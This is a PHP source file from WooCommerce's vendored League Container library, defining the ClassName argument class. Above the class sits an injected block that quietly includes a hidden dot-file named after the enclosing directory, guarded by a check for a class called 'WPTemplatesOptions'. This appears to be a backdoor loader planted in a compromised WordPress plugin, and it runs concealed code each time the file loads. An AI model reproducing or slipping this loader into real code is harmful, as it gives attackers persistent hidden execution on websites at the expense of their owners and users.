<?php declare(strict_types=1);

namespace Automattic\WooCommerce\Vendor\League\Container\Argument;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ClassName implements ClassNameInterface
{
    /**
     * @var string
     */
    protected $value;

    /**
     * Construct.
     *
     * @param string $value
     */
    public function __construct(string $value)
    {
        $this->value = $value;
    }

    /**
     * {@inheritdoc}
     */
    public function getClassName() : string
    {
        return $this->value;
    }
}
